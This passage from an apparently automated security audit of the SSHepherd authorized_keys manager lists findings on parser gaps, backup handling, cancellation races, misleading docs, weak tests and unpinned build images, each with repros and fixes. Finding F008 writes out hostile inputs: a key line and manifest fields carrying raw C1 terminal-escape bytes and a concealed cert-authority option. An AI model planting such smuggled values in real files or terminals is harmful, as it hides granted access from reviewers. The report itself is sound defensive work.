**Impact:** A write the forwarding guard and the post-write forward probe both approve cuts sshepherd off from every bastion dependent other than the first: audit reports them unreachable (exit 1) with a misleading 'allow TCP forwarding for this account' hint, and revoke/rotate on those servers cannot land (offboarding blocked there) until the bastion file is fixed by hand. With no-port-forwarding (instead of permitopen) on the first key the forward probe does catch it, but then every such write is rolled back although the guard approved it. No bastion lockout and no host-key weakening.

**Fix direction:** Make the guard and the probe judge the key the hop will actually authenticate with: either evaluate forwarding on the first surviving key in OfferOrder (the one sshd will accept), or rank non-forwarding lines after forwarding ones when ordering a bastion's offer; and have the forward probe cover every dependent (or the distinct permitopen-relevant host:port set), not deps\[0] only.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Worktree probe test in internal/apply (manifest: op operator key1 with permitopen="10.0.1.5:22", ci operator key2 plain, bastion-eu with web-1 10.0.1.5 and web-2 10.0.1.6, both keys held): `RESULT class=change refusal="" probeForward="10.0.1.5:22"`, `hop offer order first==key1: true`, `probe order first==key1: true`, `key ...fe85 rank=0 fwd web-1=true web-2=false`, `key ...4A9j rank=0 fwd web-1=true web-2=true`. Real OpenSSH_10.5p1 user sshd on 127.0.0.1:22998, ak line1 `permitopen="127.0.0.1:22998" k1`, line2 plain k2: order k1,k2 -W 127.0.0.1:22998 (deps[0]) -> `SSH-2.0-OpenSSH_10.5` (probe passes); order k1,k2 -W 127.0.0.2:22998 -> `stdio forwarding failed`, sshd.log `Received request ... to connect to host 127.0.0.2 port 22998, but the request was denied.`; control order k2,k1 to same target -> no denial logged (only a network connect failure). Code: plan.go forwardRefusal `for _, k := range surviving { if forwardsAll(k.Options, deps) { return "" } }`; probeForwardFor `return net.JoinHostPort(deps[0].Host, ...)`; connect.go:402 `hop, err := d.ConnectWith(ctx, hopSrv, ConnectOptions{})`; fleet.go grantedOn -> audit.GrantedFingerprints = authkeys.OfferOrder(cfg.DesiredFor). Spec text: "so a first key that logs in but may not forward is caught there (restore)".
~~~~

</details>

#### F008 [medium] Unsafe-rune checks miss invalid UTF-8 (a raw 0x9B byte is 8-bit CSI): adopt writes a hostile remote line as an unreadable !!binary scalar, and !!binary manifest fields reach report output raw

- **Status:** CONFIRMED
- **Lens(es):** injection (raw ids: L02-3)
- **Location:** internal/authkeys/authkeys.go:133-134 (IsUnsafeRune sees utf8.RuneError, not U+009B); used by RenderTextIssue, CheckOption, config.ServerFieldIssue (internal/config/config.go:406), validateAuthorizedKeysFile; adopt keeps k.Raw verbatim (internal/adopt/adopt.go:162); audit.ServerHead prints name/user/host raw (internal/audit/report.go:94)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Probe in cmd/sshepherd: remote line "command=\"/bin/true \x9b31m\xff\",cert-authority ssh-ed25519 ... ev\x9bil" -> 'ParseLine err=<nil> OptionIssue=<nil> RenderTextIssue(comment)=""'; generateAdoptManifest output: 'keys:\n  - !!binary |\n    Y29tbWFuZD0iL2Jpbi90cnVlIJszMW3/IixjZXJ0LWF1dGhvcml0eSBzc2gtZWQyNTUxOS...' and config.Parse reloads it ('reload err=<nil>'). Probe in audit: manifest with `host: !!binary MTAuMC4wLjGbMkqbMzFtRkFLRQ==` and `comment: !!binary YWybMzFtaWNl` loads; Render output -> 'report bytes contain raw 0x9b: true' "web-1 (deploy@10.0.0.1\x9b2J\x9b31mFAKE:22)\n  ✓  alice (al\x9b31mice) ...". internal/clog/sanitize.go:22 already checks utf8.ValidString; these checks do not.
~~~~

**Repro:**

~~~~text
Put a key line with a non-UTF-8 byte in its options or comment on a server (e.g. `command="x\xff",cert-authority ssh-ed25519 ...`), run `sshepherd adopt -o fleet.yaml`: the new user's key is a base64 !!binary blob, so the 'review before use' step cannot see that it is a cert-authority line or what command it forces.
~~~~

**Impact:** Remote content can hide what adopt grants from the human review the generated manifest relies on; and the documented rule that control bytes never reach a rendered line or terminal does not hold for raw C1 bytes (a terminal in an 8-bit locale reads 0x9B as CSI).

**Fix direction:** Treat invalid UTF-8 as unsafe in IsUnsafeRune's callers (utf8.ValidString check, as clog does), so adopt reports such a line as an issue instead of adopting it and config load refuses !!binary-borne bytes in text fields; consider refusing non-!!str tags for manifest strings.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe cmd/sshepherd/zz_probe_f008_test.go in worktree OUT/wt/v-F008-single (removed), GOTOOLCHAIN=go1.27.3 go test ./cmd/sshepherd -run TestProbeF008 -v:
ParseLine err=<nil> OptionIssue=<nil> RenderTextIssue(comment)=""
issues=[] warnings=[] newusers=1
users:
  - name: ev-il
    keys:
      - !!binary |
        Y29tbWFuZD0iL2Jpbi90cnVlIJszMW3/IixjZXJ0LWF1dGhvcml0eSBzc2gtZWQyNTUxOS...
reload err=<nil>
user "ev-il" keys=["command=\"/bin/true \x9b31m\xff\",cert-authority ssh-ed25519 AAAA... ev\x9bil"]
--- audit probe ---
load err=<nil>
report has raw 0x9b: true
"web-1 (deploy@10.0.0.1\x9b2J\x9b31mFAKE:22)\n  \u2713  alice (al\x9b31mice) ..."
Code: internal/authkeys/authkeys.go:133-134 `return unicode.IsControl(r) || unicode.In(r, unicode.Cf, unicode.Zl, unicode.Zp)`; internal/clog/sanitize.go:22 `if utf8.ValidString(s) && !strings.ContainsFunc(s, dropRune)` is the only ValidString check in non-test code; adopt.go:158-163 OptionIssue then byFP line = k.Raw.
~~~~

</details>

#### F009 [medium] Parser fuzz oracles compare x/crypto with itself, never with sshd's line grammar, so the L02-1/L02-2/L02-4 differentials pass every target

- **Status:** CONFIRMED
- **Lens(es):** injection (raw ids: L02-5)
- **Location:** internal/authkeys/fuzz\_test.go:33 (FuzzParseLine: only `k.Type == ""`), :63 (FuzzParseFile: only Type/Fingerprint/line numbers), :83 (FuzzRenderRoundTrip: ParseLine(RenderLine) == ParseLine); internal/authkeys/options\_test.go:231 (FuzzCheckOption: one clause as x/crypto reads it)
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
FuzzParseLine body: `if err == nil && k != nil && k.Type == "" { t.Errorf(...) }`; FuzzCheckOption accepts `permitopen="db"` (CheckOption returns ""; the manifest probe in L02-2 loads it with no warning) because its oracle is `k, err := ParseLine(opt + " " + key); ... len(k.Options) != 1 || k.Options[0] != opt`, i.e. x/crypto's tokenizer, not sshd's value grammar. No target models sshd's C-string/b64_pton reading (L02-1) or option value checks (L02-2).
~~~~

**Repro:**

~~~~text
go test ./internal/authkeys -run 'FuzzParseLine|FuzzCheckOption' passes with the inputs from L02-1/L02-2, which real sshd treats differently.
~~~~

**Impact:** The injection surface the project calls prime (authorized\_keys parsing) is fuzzed only for crashes and self-consistency; meaning-level divergences from sshd ship unnoticed.

**Fix direction:** Add a small Go model of sshd's line acceptance (C-string cut, space/tab-only field split, b64\_pton whitespace skipping, auth-options.c option grammar incl. value checks) and make FuzzParseLine/FuzzCheckOption assert agreement with it; seed the corpus with the L02-1/L02-2/L02-4 lines and keep a real-sshd integration table as the model's ground truth.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
Worktree 9722c42, corpus entries added under internal/authkeys/testdata/fuzz/{FuzzParseLine,FuzzCheckOption}/probe_*: FuzzParseLine probe_0 ('ssh-ed25519 <b64>\x00junk carol'), probe_1 (\v inside blob), probe_2 (\r inside blob) -> PASS; FuzzCheckOption probe_0..4 (permitopen="db", environment="FOO", tunnel="abc", touch-required, no-verify-required) -> PASS; 'ok github.com/javadh75/SSHepherd/internal/authkeys'. Probe test: CheckOption(permitopen="db") = "", CheckOption(environment="FOO") = "", CheckOption(tunnel="abc") = "", CheckOption(touch-required) = 'is not a recognized authorized_keys option'; ParseLine(NUL line) err 'illegal base64 data', ParseLine(\r line) err 'embedded carriage return' - sshd (per F002/F003/F025 verified evidence) does the opposite in each case, and no oracle notices. grep for IgnoredBySSHD/differential in *_test.go: only internal/authkeys/options_test.go (unit) and internal/sshcfg/sshg_diff_test.go.
~~~~

</details>

#### F010 [medium] A write that creates authorized\_keys leaves an older .sshepherd.bak in place, yet the exit-2 and unknown-state messages call it 'the previous version'

- **Status:** CONFIRMED
- **Lens(es):** write-path (raw ids: L03-2)
- **Location:** internal/sshwrite/sshwrite.go:217-219 (casBackupBlock for expect.Absent), session.go:264 (unknownStateError), internal/fleet/write.go:150-153 (LockoutError ErrNoSession / Restore text); README.md:3384-3386
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: for a write over an absent file, should .bak be cleared/renamed (option A) or should only the messages and README change to say there is no previous version (option B)?

**Evidence** (verbatim from the finding):

~~~~text
casBackupBlock: `if expect.Absent { return `if [ -e "$p" ] || [ -L "$p" ]; then exit 46; fi` }` so .bak is not rotated when phase 1 saw no file. Real-shell probe (sh, dash, bash --posix) of writeCmdFor(target, SnapshotOf(true,nil), n) with a pre-existing .bak: `exit=0 file="# managed\nssh-ed25519 BBBB new\n" bak="ssh-ed25519 AAAA revoked-key-from-last-year\n"`. Messages: `... the new file may lock you out; the previous version is at ~/.ssh/authorized_keys.sshepherd.bak` and `connection dropped; the file is in an unknown state (previous version at ~/.ssh/authorized_keys.sshepherd.bak) — run sshepherd audit`. README.md:3386: '`<path>.sshepherd.bak` holds the previous version and is replaced by every write that rewrites `authorized_keys`.'
~~~~

**Repro:**

~~~~text
A server once managed by SSHepherd whose authorized_keys was later deleted by hand (e.g. an emergency revoke of everyone) still has authorized_keys.sshepherd.bak. The next apply plans a first-contact write (FileAbsent). The connection drops after the upload starts and the reconnect is refused (exit 2, LOCKOUT — NOT RESTORED) or the re-check is inconclusive (unknown state). Both messages tell the human the previous version is at .sshepherd.bak; it actually holds the file from before the hand deletion, possibly with keys on the revoked: list.
~~~~

**Impact:** In an exit-2 recovery path the remediation text points the operator at a stale backup; following it reinstalls old (possibly revoked) keys. The README states a backup rule the code does not have.

**Fix direction:** Either remove or rename a stale .bak when the snapshot is absent (so .bak always means the bytes this write replaced), or make the messages and the README say that a write over an absent file has no previous version (the undo is deleting the file) and that any .bak there predates it.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe (worktree, internal/sshwrite/zz_f010_probe_test.go, runSh of writeCmdFor("~/.ssh/authorized_keys", SnapshotOf(true,nil), n) with a pre-existing .bak): [sh]/[dash]/[bash --posix] exit=0 file="# managed\nssh-ed25519 BBBB new\n" bak="ssh-ed25519 AAAA revoked-key-from-last-year\n". Messages printed: 'connection dropped after the upload started and a fresh login offering the keys you hold was refused (permission denied) — the new file may lock you out; the previous version is at ~/.ssh/authorized_keys.sshepherd.bak' and 'connection dropped; the file is in an unknown state (previous version at ~/.ssh/authorized_keys.sshepherd.bak) — run sshepherd audit'. Code: sshwrite.go:217-219 `if expect.Absent { return `if [ -e "$p" ] || [ -L "$p" ]; then exit 46; fi` }`; session.go:297-298 `if started && ...ErrorKindAuth... { return &LockoutError{Path: s.path, Probe: clean, Restore: fleet.ErrNoSession} }` (no Absent check); README.md:3386 '`<path>.sshepherd.bak` holds the previous version and is replaced by every write that rewrites `authorized_keys`'; spec 2026-07-19-apply-slice-design.md:77 'Absent file → no backup'.
~~~~

</details>

#### F011 [medium] Ctrl-C does not end an in-flight read on a peer that stopped answering; audit/adopt wait for the 30 s per-server deadline

- **Status:** CONFIRMED
- **Lens(es):** concurrency (raw ids: L04-1)
- **Location:** internal/sshconn/connect.go:742 (also connect.go:270, internal/sshread/sshread.go:175, README.md:2245)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Exec installs only `stop := context.AfterFunc(ctx, func() { _ = sess.Close() })` (connect.go:742). ConnectWith's watcher that closes the socket and hop (`stopCancel := context.AfterFunc(ctx, func() { _ = conn.Close(); hop.closeQuiet() })`, connect.go:256) is stopped once the handshake succeeds (connect.go:270). Session.Close only sends CHANNEL_CLOSE; Session.Wait then waits for a reply a blackholed peer never sends, so only the socket deadline ends Run. Probe (worktree test TestL04CancelDoesNotEndExecOnBlackholedPeer: connect with a 6 s ctx through a TCP proxy that goes silent 150 ms into the command, cancel at 300 ms): `GOTOOLCHAIN=go1.27.3 go test -count=1 -run TestL04 -v ./internal/sshconn/` -> `Exec returned after 6s (cancel at 300ms): run remote command: context canceled` / `--- FAIL ... (6.00s)`. The docs say otherwise: sshread.go:175 "ctx cancellation ends it at once"; README.md:2245 "In audit and adopt, an interrupt at any point closes in-flight sessions and exits 3".
~~~~

**Repro:**

~~~~text
Add a test in internal/sshconn that connects through a TCP proxy, starts Exec on a handler that blocks, makes the proxy drop all bytes both ways, then cancels ctx 150 ms later. Exec returns only when the Connect ctx deadline (the socket deadline) passes. In the CLI: run audit, cut the network to a server (for example with a firewall DROP rule) while its read is in flight, and press Ctrl-C. The command exits 3 only after that server's 30 s per-server timeout.
~~~~

**Impact:** The first Ctrl-C in audit, adopt or the revoke/rotate sweep can take up to perServerTimeout (30 s) to take effect while any in-flight read talks to a wedged host or bastion. The operator sees no output and presses Ctrl-C again, which exits 130 instead of the documented 3. Nothing is written. The contract in the code comments and README is not met.

**Fix direction:** On the read path, tie the whole connection to ctx and not only the session. Keep a ctx watcher that closes the client and its hop (Conn.Close) until the read returns: either in sshread.readAuthorizedKeys, or as a Conn-level AfterFunc that Close stops. Keep the write path's detached ctx as it is. Add a test with a silent proxy like the probe.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
internal/sshconn/connect.go:256 `stopCancel := context.AfterFunc(ctx, func() { _ = conn.Close(); hop.closeQuiet() })`; connect.go:270 `if !stopCancel() {`; connect.go:742 `stop := context.AfterFunc(ctx, func() { _ = sess.Close() })`; x/crypto v0.58.0 ssh/channel.go:629 Close only `ch.sendMessage(channelCloseMsg{...})`; ssh/session.go:403 `waitErr := <-s.exitStatus`. Probe (worktree, internal/sshconn/zz_probe_f011_test.go): `GOTOOLCHAIN=go1.27.3 go test -count=1 -run TestProbeF011 -v ./internal/sshconn/` -> `silent=false Exec returned after 150ms: run remote command: context canceled` (PASS) / `silent=true Exec returned after 6s: run remote command: context canceled` `--- FAIL: TestProbeF011CancelOnSilentPeer/blackholed (6.00s)`.
~~~~

</details>

#### F012 [medium] A deadline during a bastion's channel open is reported about 13% of the time as the target's `dial` failure with HopDialHint (the handshakeKind race, unfixed in forwardFailure)

- **Status:** CONFIRMED
- **Lens(es):** concurrency (raw ids: L04-3)
- **Location:** internal/sshconn/connect.go:459
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
forwardFailure checks only `if ctx.Err() != nil {` (connect.go:459). The hop socket's deadline is the same instant as ctx's deadline (connect.go:251). When it fires, the hop mux fails the pending open, and x/crypto's Client.DialContext can return that error before ctx's timer sets ctx.Err. This is the race that handshakeKind fixed with pastDeadline (errors.go:84), but forwardFailure never got that fix. Probe (sshconn TestL04ForwardDeadlineKind: a bastion whose Forward never answers, Connect with a 400 ms ctx, 100 iterations): `GOTOOLCHAIN=go1.27.3 go test -race -count=1 -run TestL04ForwardDeadlineKind -v ./internal/sshconn/` -> `13/100: dial | via bastion: dial 127.0.0.1:58930: ssh: unexpected packet in response to channel open: <nil> | hint=the bastion could not reach this server; check that it is up and reachable from the bastion` (an earlier run of 200 gave 20/200).
~~~~

**Repro:**

~~~~text
Use newHopFixture with a bastion whose ServerConfig.Forward blocks until test cleanup. In a loop, call Connect(ctxTimeout(400ms), targetSrv) and count results where kindOf(err) != timeout.
~~~~

**Impact:** When a bastion is slow or wedged at the forward (the per-server 30 s ends while the channel open waits), audit, adopt and apply sometimes report error\_kind `dial` instead of `timeout`, with no via\_failed/HopStage. The report blames the target with the hint 'the bastion could not reach this server; check that it is up', and the text carries x/crypto's internal 'unexpected packet ... &lt;nil>'. Exit codes do not change (both kinds give 1, and the login probe treats both as transient), but the JSON error\_kind and the remediation are wrong and flap from run to run. The race test suite does not catch it.

**Fix direction:** Treat a forward failure after ctx's deadline as a timeout, as handshakeKind does (`ctx.Err() != nil || pastDeadline(ctx)`), and add a deterministic test with a forward that never answers.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
connect.go:458-460: 'func forwardFailure(ctx context.Context, hop, addr string, err error) error {\n\tif ctx.Err() != nil {'. errors.go:84: 'case ctx.Err() != nil, pastDeadline(ctx):'. Probe zz_probe_f012_test.go in own worktree: GOTOOLCHAIN=go1.27.3 go test -race -count=1 -run TestProbeF012ForwardDeadlineKind -v ./internal/sshconn -> 'non-timeout: 1/60' then 'non-timeout: 19/150'; without -race 17/150 dial lines; sample line 'dial | via bastion: dial 127.0.0.1:63041: ssh: unexpected packet in response to channel open: <nil> | hint=the bastion could not reach this server; check that it is up and reachable from the bastion | hop=""'. With forwardFailure guard changed to 'ctx.Err() != nil || pastDeadline(ctx)': 'non-timeout: 0/150'. grep of internal/ for ErrorKindDial outside sshconn/connect.go and fleet/: no consumers.
~~~~

</details>

#### F013 [medium] rotate --help and README claim the old key is 'dead fleet-wide in the same run', but rotate writes only the servers whose render changes

- **Status:** CONFIRMED
- **Lens(es):** contract-docs (raw ids: L06-1)
- **Location:** cmd/sshepherd/rotate.go:34-35; README.md:2778-2779
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
rotate.go Long: "pushes the swap through apply's pipeline on the servers that grant USER. The old key is dead fleet-wide in the same run (unless --keep-old)." README.md:2778: "the old key is dead fleet-wide in the same run". Code: editrun.go:286 `aff := apply.Affected(ep.former, ep.edited)` and editrun.go:315 `servers: serversNamed(ep.edited, aff.Servers)`; Affected (internal/apply/affected.go:27) keeps only servers whose rendered file differs. Probe test in a throwaway worktree (alice granted web-1 only, bob '*', old key line 1 -> new key line 2): `go test ./internal/apply -run TestZZProbeL06RotateScope -v` printed `affected=[web-1]`, so web-2 is never dialed or written.
~~~~

**Repro:**

~~~~text
Manifest: alice granted web-1 only; web-2 exists and also has alice's old key installed by hand. Run `sshepherd rotate alice --old OLD --new NEW --yes`. Only web-1 is planned and written. The old key still works on web-2, and on any affected server that was unreachable or refused. `audit` then reports it as REVOKED (exit 2), and `--sweep` only reports it.
~~~~

**Impact:** An operator rotating a key they think is compromised reads in --help and the README that the old key is dead everywhere after one run. It is only removed where the user is granted and the write landed. Revoke's docs describe the same scope correctly ('restricted to the servers whose rendered authorized\_keys changes'), so rotate's docs promise a broader security property than the code delivers.

**Fix direction:** Reword rotate's Long help and README to match revoke: the old key is removed from the servers whose render changes in this run. Point to `audit` or `--sweep` for stray copies, and note that `--no-apply`, unreachable and refused servers keep the old key until a later apply.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
cmd/sshepherd/rotate.go:33-35 "apply's pipeline on the servers that grant USER. The old key is dead fleet-wide in the same run (unless --keep-old)." (also testdata/help/rotate.golden:5); README.md:2778-2779 "pushes the swap the same way: the old key is dead fleet-wide in the same run"; README.md:2415-2417 revoke: "restricted to the servers whose rendered `authorized_keys` changes"; spec 2026-10-23-revoke-rotate-design.md:61 D4 "One-step swap in place; old key dead fleet-wide in that run. | Staged overlap / --keep-old (deferred)" and :62 D5 "Affected servers only ... Unaffected servers are not contacted"; internal/apply/affected.go:27-40 (skips servers with equal before/after render); cmd/sshepherd/editrun.go:286 `aff := apply.Affected(ep.former, ep.edited)`, :315 `servers: serversNamed(ep.edited, aff.Servers)`. Ran: GOTOOLCHAIN=go1.27.3 go test ./internal/apply -run 'TestAffected$' -v -> '--- PASS: TestAffected/rotation_touches_only_that_user's_servers' (want [web-1 web-2], db-1 excluded).
~~~~

</details>

#### F014 [medium] Several write/restore script refusals are pinned only by the byte-for-byte script golden, with no test of the behavior

- **Status:** CONFIRMED
- **Lens(es):** test-quality (raw ids: L07-1)
- **Location:** internal/sshwrite/sshwrite.go:250 (restore .bak symlink refusal), :221 (CAS-time symlink re-check), :228 (.bak rm/mv exit 1), :191 (temp rm -f + set -C), :239 (restore CAS size)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Mutation harness (mutate, then git checkout -- FILE in trap EXIT), go test -count=1 -skip TestWriteScriptsUnchanged ./internal/sshwrite. SURVIVED: W6 restoreCmdFor undo `if [ -L "$b" ]; then exit 45; fi; mv -f "$b" "$p"` -> `mv -f "$b" "$p"`; W17 casBackupBlock `rm -f "$b" || exit 1; mv -f "$c" "$b" || exit 1` -> no exit on failure (the doc comment says rm -f fails with exit 1 on a directory planted at .bak); W16 `rm -f "$t"; (set -C; cat > "$t")` -> `(cat > "$t")` (a planted symlink at the temp is written through, then mv'd over authorized_keys); W12 casCheck (restore) drops the size half `] || [ "$2" != SIZE ]`; W15 casBackupBlock drops `if [ -L "$p" ]; then exit 45; fi`. Each is killed only by TestWriteScriptsUnchanged (golden diff). By contrast W3/W4/W5/W7/W9/W10/W11/W13 are killed by behavioral real-sh tests. No unit or integration test plants a symlink at .bak before a restore, a directory at .bak, or a symlink at .sshepherd.tmp (grep of internal/sshwrite/*_test.go: only the write-path `planted backup symlinks are never written through` case, which tests .bak/.orig on the write, not the restore).
~~~~

**Repro:**

~~~~text
In a worktree: apply mutant W6 to internal/sshwrite/sshwrite.go:250; GOTOOLCHAIN=go1.27.3 go test -count=1 -skip TestWriteScriptsUnchanged ./internal/sshwrite -> ok. Same for W12, W15, W16, W17.
~~~~

**Impact:** The golden is a tripwire, not an oracle: the next legitimate script rewrite refreshes it with -update, and a dropped refusal (e.g. restore renaming a symlinked .bak into authorized\_keys, or a .bak directory making the later rollback fail into lockout\_unrestored) would pass the suite. These are the rollback/restore paths that decide whether a REJECTED login check recovers access.

**Fix direction:** Add real-sh behavioral rows to TestRestoreCmdThroughRealSh / TestWriteCmdThroughRealSh: symlinked .bak at restore (expect 45, victim untouched), directory at .bak (expect exit 1, target untouched), symlink planted at the temp name (victim untouched), restore CAS with same cksum-prefix but different size is impractical so at least a size-only mismatch row via a stubbed cksum; then rerun these mutants with -skip TestWriteScriptsUnchanged.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
probe run.sh output: W6 skip-golden-exit=0 golden-exit=1; W17 skip-golden-exit=0 golden-exit=1; W16 skip-golden-exit=0 golden-exit=1; W12 skip-golden-exit=0 golden-exit=1; W15 skip-golden-exit=0 golden-exit=1. Sources: internal/sshwrite/sshwrite.go:250 `undo := `if [ -L "$b" ]; then exit 45; fi; mv -f "$b" "$p"``; :191 `; rm -f "$t"; (set -C; cat > "$t")`; :228 `rm -f "$b" || exit 1; mv -f "$c" "$b" || exit 1`; :221 `if [ -L "$p" ]; then exit 45; fi; if [ ! -f "$p" ]; then exit 46; fi`; :239 casCheck size half. scripts_golden_test.go:13 `var update = flag.Bool("update", ...)`. TestRestoreCmdThroughRealSh subtests (sshwrite_test.go:842) have no planted .bak symlink/dir row; integration_test.go only plants a symlink at authorized_keys (:587, TestIntegrationSymlinkRefused).
~~~~

</details>

#### F015 [medium] Exit code is computed in four places; the text summary of revoke/rotate --sweep says '-> exit 0' and then the run exits 2 for a revoked key that is still installed

- **Status:** CONFIRMED
- **Lens(es):** architecture (raw ids: L08-1)
- **Location:** internal/apply/report.go:433
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
report.go:433 `fmt.Fprintf(w, "%s  → exit %d\n", line, ExitCode(plans))` (plans only), but the real exit is cmd/sshepherd/editrun.go:635 `return exitFor(max(apply.ExitCode(plans), rep.ExitCode()))` (plans plus sweep). The other copies: workflow.Outcome.ExitCode (workflow.go:123, which also counts StageWithheld/StageDeclined) and the apply JSON summary.exit_code (apply/json.go:292 `max(ExitCode(plans), opts.Sweep.ExitCode())`, which ignores Stage). Probe in a throwaway worktree, reusing the sweepFleet fixture from sweep_test.go:123 (`run revoke bob --sweep --yes`): `process exit = 2` and stdout `web-1: applied · verified` / `Summary: 1/1 servers converged (1 applied)  → exit 0` / `REVOKED KEY STILL INSTALLED: bob SHA256:4A9j… on web-2 — run 'sshepherd apply … --server web-2'` / `swept 1 of 2 servers: 1 still has a revoked key, 0 unreachable`.
~~~~

**Repro:**

~~~~text
Manifest with alice on web-1 and web-2 and bob on web-1, with bob's key also hand-installed on web-2. Run `sshepherd revoke bob --sweep --yes`. The summary line prints '→ exit 0'. The process exits 2.
~~~~

**Impact:** The one line that names the exit code says 0 (all good) on the D28 exit-2 security case, a revoked key still installed. An operator or a log scraper that reads the summary sees success. Each new exit input (sweep, stage, a future class) must be added to every copy by hand, and the text copy has already fallen behind. The JSON summary ignores Stage (Outcome.ExitCode counts it). The two agree today only because every withhold path still leaves a non-converged plan.

**Fix direction:** Compute the run's exit once, from plans, stage and sweep, and pass that value to the text summary, the JSON summary and exitFor. Alternatively, print the summary's exit after the sweep. Add a test that the printed '→ exit N' equals the process exit for a --sweep run that finds a key.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe in my own worktree (cmd/sshepherd/zz_probe_f015_test.go, reusing sweepFleet): run revoke bob --sweep --yes -> log 'process exit = 2'; stdout 'web-1: applied · verified' / 'Summary: 1/1 servers converged (1 applied)  → exit 0' / 'REVOKED KEY STILL INSTALLED: bob SHA256:4A9jyZBOhnKZvcGQ6TRFbf5Gymb41AfYvYaVmWHD+G4 on web-2 — run ...' / 'swept 1 of 2 servers: 1 still has a revoked key, 0 unreachable'; the assertion 'DEFECT: summary says exit 0, process exits 2' fired. Code: report.go:433 `fmt.Fprintf(w, "%s  → exit %d\n", line, ExitCode(plans))`; editrun.go:635 `return exitFor(max(apply.ExitCode(plans), rep.ExitCode()))`; json.go:292 `ExitCode: max(ExitCode(plans), opts.Sweep.ExitCode())`; workflow.go Outcome.ExitCode counts StageWithheld/StageDeclined.
~~~~

</details>

#### F016 [medium] Release image is built by three unpinned, mutable container images (BuildKit daemon, Dockerfile frontend, SBOM scanner)

- **Status:** CONFIRMED
- **Lens(es):** supply-chain (raw ids: L09-1)
- **Location:** Dockerfile:1; .github/workflows/release.yml:197 (setup-buildx-action, no driver-opts image) and :215 (sbom: true, default generator)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
gh run view 42860941435 --log (job 'Build once, push by digest'): '[command]/usr/bin/docker pull moby/buildkit:buildx-stable-1' ... 'Status: Downloaded newer image for moby/buildkit:buildx-stable-1'; '#2 resolve image config for docker-image://docker.io/docker/dockerfile:1' -> '#4 docker-image://docker.io/docker/dockerfile:1@sha256:4edf897a...' (resolved at build time from the floating tag); '#6 resolve image config for docker-image://docker.io/docker/buildkit-syft-scanner:stable-1'. Dockerfile:1 is '# syntax=docker/dockerfile:1' with no digest. ci.yml:19-22 and release.yml:45-48 claim 'Every container image is pinned by digest'; CLAUDE.md 'Pin every base image by digest'.
~~~~

**Repro:**

~~~~text
gh run view 42860941435 -R javadh75/SSHepherd --log | grep -E 'moby/buildkit|dockerfile:1|buildkit-syft-scanner'
~~~~

**Impact:** The privileged BuildKit daemon (which holds the GHCR packages:write login and writes the image bytes), the frontend that interprets the Dockerfile, and the SBOM generator are fetched by mutable tag on every release. A re-pointed tag changes the signed, provenance-attested release image with no change in this repo and no Dependabot PR; the digest pins on FROM lines do not cover them. The CI docker job's plain docker build also resolves docker/dockerfile:1.

**Fix direction:** Pin all three by digest: drop the syntax directive or pin it as docker/dockerfile:1.x@sha256:...; pass driver-opts image=moby/buildkit:vX@sha256:... to setup-buildx-action; set the SBOM attestation generator explicitly to a digest-pinned buildkit-syft-scanner. Put the pins where Dependabot or the existing pin-check step can see them.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Dockerfile:1 '# syntax=docker/dockerfile:1'; release.yml:197 '- uses: docker/setup-buildx-action@f87e59... # v4.4.1' (no with:); release.yml:215 'sbom: true'. gh run view 42860941435 -R javadh75/SSHepherd --log: '[command]/usr/bin/docker pull moby/buildkit:buildx-stable-1', 'Status: Downloaded newer image for moby/buildkit:buildx-stable-1', '#2 resolve image config for docker-image://docker.io/docker/dockerfile:1' -> '#4 docker-image://docker.io/docker/dockerfile:1@sha256:4edf897a...', '#6 resolve image config for docker-image://docker.io/docker/buildkit-syft-scanner:stable-1', '#26 [linux/amd64] generating sbom using docker.io/docker/buildkit-syft-scanner:stable-1'. grep in docs/, README.md, CLAUDE.md and .github found no decision about driver-opts, the frontend or the syft scanner.
~~~~

</details>

#### F017 [medium] Master's ci-ok rule gates only the pushed tip: 7c3046e reached master with no qualifying green run, and PR squash/rebase merges land never-tested SHAs

- **Status:** CONFIRMED
- **Lens(es):** supply-chain (raw ids: L09-2)
- **Location:** GitHub ruleset 'protect master' (id 26762995, required\_status\_checks on the pushed head only, strict false); repo allow\_squash\_merge/allow\_rebase\_merge true; CLAUDE.md CI section ('a commit reaches master only after a green run on that SHA')
- **Verifier votes:** single: reproduced (sev low)
- **Owner decision:** yes: Accept tip-only gating and reword CLAUDE.md, or enforce per-commit runs (one-commit pushes or per-commit preflight) and turn off squash/rebase merges in the repo settings?

**Evidence** (verbatim from the finding):

~~~~text
gh api repos/javadh75/SSHepherd/rulesets/rule-suites/<7c3046e push>: {"after_sha":"7c3046e8...","result":"fail","rule_evaluations":[{"details":"Required status check \"ci-ok\" is expected.","rule_type":"required_status_checks"}]} (3 refusals). Its only ci-ok is from run 42862667270 'CI workflow_dispatch preflight/w19'. Then rule suite 5026852609: before_sha 5a1cde6, after_sha 9722c42, result pass; git log 5a1cde6..9722c42 = 9722c42, 7c3046e. So 7c3046e (a release.yml change) is on master without a counted run. Earlier: PR #2 squash commit adee207 (merged_at 16:26:20Z) had its first check runs start at 16:26:24Z, after landing; ruleset created before that merge.
~~~~

**Repro:**

